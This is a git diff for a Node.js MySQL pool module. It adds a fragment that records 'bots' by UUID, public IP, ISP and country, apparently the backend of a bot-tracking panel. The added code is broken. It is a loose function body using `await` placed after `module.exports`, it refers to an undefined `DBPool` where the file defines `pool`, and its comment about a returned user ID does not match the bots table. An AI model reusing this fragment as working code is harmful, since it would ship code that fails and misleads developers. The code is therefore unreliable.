@@ -18,3 +18,27 @@ const pool = mysql.createPool({
 });
 
 module.exports = pool;
+
+    let connection;
+    try {
+      connection = await DBPool.getConnection();
+      const [result] = await connection.query(
+        `INSERT INTO bots (uuid, updated_at, publicip, isp, country)
+         VALUES (?, NOW(), ?, ?, ?)
+         ON DUPLICATE KEY UPDATE
+          updated_at = NOW(),
+          publicip = VALUES(publicip),
+          isp = VALUES(isp),
+          country = VALUES(country)`,
+        [
+          botUId,
+          clientIp,
+          isp, country
+        ]
+      );
+      return result.insertId; // Return the inserted user ID
+    } catch (err) {
+      throw err;
+    } finally {
+      if (connection) connection.release();
+    }
